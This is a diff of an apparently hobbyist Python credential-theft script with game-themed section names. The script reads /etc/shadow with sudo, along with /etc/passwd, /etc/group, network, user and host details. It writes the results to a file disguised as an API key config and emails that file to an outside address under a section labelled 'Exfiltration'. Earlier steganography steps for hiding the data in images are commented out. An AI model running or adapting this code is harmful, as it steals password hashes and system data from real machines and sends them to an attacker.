@@ -15,6 +15,7 @@ import os
 export_section = ''
 section_header = '-------------'
 section_footer = "-------------------------------------------\n"
+log_update_counter=0
 
 # ------- Header -------
 
@@ -24,8 +25,8 @@ print("-------------------------------------------\n")
 
 # ------- Functions -------
 
+
 def sudo_command(command, report):
-    log_update_counter = 0
 
     sudo_access = pexpect.spawn(command)
     sudo_access.expect('for', timeout=1000)
@@ -33,11 +34,9 @@ def sudo_command(command, report):
     sudo_access.expect(pexpect.EOF)
     output = sudo_access.before.decode('utf-8')
 
-    if report:
-        filename = f'API_KEY_nat1-0103{log_update_counter}fGs0d86asd89sGrEDA3.conf'
-        with open(filename, 'w') as file:
-            file.write(output)
-        log_update_counter += 1
+    if report == True:
+        with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'a') as f:
+            f.write(output)
 
     return output
 
@@ -67,7 +66,6 @@ def steg_command(to_be_hidden, to_hide):
 
     return 
 
-
 # ------- Command Class -------
 
 class SkillCheck:
@@ -76,10 +74,19 @@ class SkillCheck:
     def __init__(self, name):
         self.name = name
 
-    def proficiency(self, ability_score):
+    def proficiency(self, ability_score, report):
         print("\n", section_header + self.name + section_header)
-        subprocess.run(ability_score.split())
+    
+        command_for_log = subprocess.run(ability_score.split(), capture_output=True, text=True)
+    
+        log_output = command_for_log.stdout
+
+        with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'a') as f:
+            f.write(log_output) 
+
         print(section_footer)
+        return log_output
+
 
     def inspiration(input, ability_score, report):
         sudo_command(ability_score, report)
@@ -92,6 +99,10 @@ class SkillCheck:
 
 
 def basicScan():
+
+    with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'w') as f:
+        f.write('----------------Start---------------')
+
     # ------- Inspiration -------
     etcshadow_bot = SkillCheck("Home Directory Health")
     etcshadow_bot.inspiration('sudo cat /etc/shadow', True)
@@ -105,28 +116,29 @@ def basicScan():
 
     # ------- Proficiency -------
     ip_addr_bot = SkillCheck("IP")
-    ip_addr_bot.proficiency('ip addr')
+    ip_addr_bot.proficiency('ip addr', True)
 
     online_users_bot = SkillCheck("Online Users")
-    online_users_bot.proficiency('who')
+    online_users_bot.proficiency('who', True)
 
     passwd_bot = SkillCheck("/etc/passwd")
-    passwd_bot.proficiency('cat /etc/passwd')
+    passwd_bot.proficiency('cat /etc/passwd', True)
 
     host_bot = SkillCheck("Host System")
-    host_bot.proficiency('uname -a')
+    host_bot.proficiency('uname -a', True)
 
     group_bot = SkillCheck("Groups")
-    group_bot.proficiency("cat /etc/group")
+    group_bot.proficiency("cat /etc/group", True)
 
 
 # ------- Exfiltration -------
 
+'''
 def secret_ingredient():
     mosquito_in_amber()
     steg_command('./logs/API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'steg.png')
     steg_command('elbow_grease.txt', 'dfstd.png')
-
+'''
 
 def one_mail():
     send_email(
@@ -134,20 +146,11 @@ def one_mail():
         secret_var,
         'riwos15373@pngzero.com',
         'Exfiltration Info',
-        'Two pictures that are not at all dinosaur related.',
-        './steg.jpg'
+        'Look man this code thing is hard enough as is alright get off my back.',
+        './API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf'
     )
 
-    send_email(
-        'living.like.bob.was.taken@gmail.com',
-        secret_var,
-        'radecab534@lewou.com',
-        'Exfiltration Info',
-        'Two pictures that are not at all dinosaur related.',
-        './dfstd.jpg'
-    )
-
-
+'''
 def combine_logs(directory):
     # Safe create directory
     os.makedirs(directory, exist_ok=True)
@@ -165,16 +168,15 @@ def combine_logs(directory):
 
             with open(master_log, 'a') as file:
                 file.write(content + '\n')
-
+'''
 
 # ------- Execution -------
 
 def __main__():
-    combine_logs('./logs')
-    secret_ingredient()
+#    secret_ingredient()
     basicScan()
+#    combine_logs('./logs')    
     one_mail()
-
 
 if __name__ == '__main__':
     __main__()
